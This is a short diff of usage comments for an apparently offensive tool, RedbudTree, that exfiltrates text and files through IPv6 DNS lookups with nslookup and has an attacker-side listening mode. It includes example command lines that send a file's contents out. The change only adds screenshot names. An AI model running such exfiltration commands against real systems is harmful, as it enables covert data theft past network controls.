@@ -24,12 +24,12 @@ step 3:
 /// Syntax 1: RedbudTree.exe "AAAA" "Text"  
 /// Example1: RedbudTree.exe AAAA "this is my test" 
 
-/// Syntax 2: Creating Exfiltration DATA via IPv6 Address and Nslookup by Text Files.         
+/// Syntax 2: Creating Exfiltration DATA via IPv6 Address and Nslookup by Text Files.  (redbudtree_2.png)        
 /// Syntax 2: RedbudTree.exe "AAAA" "FILE" "TextFile.txt"  
 /// Example2: RedbudTree.exe AAAA FILE "TextFile.txt" 
 
 /// Syntax 3: RedbudTree with Listening Mode          
 /// Syntax 3: RedbudTree.exe  
-Note: syntax 3 is ((Dumping DATA via IPv6 Requests , attacker side))
+Note: syntax 3 is ((Dumping DATA via IPv6 Requests , attacker side)) (redbudtree_3.png)
 
 
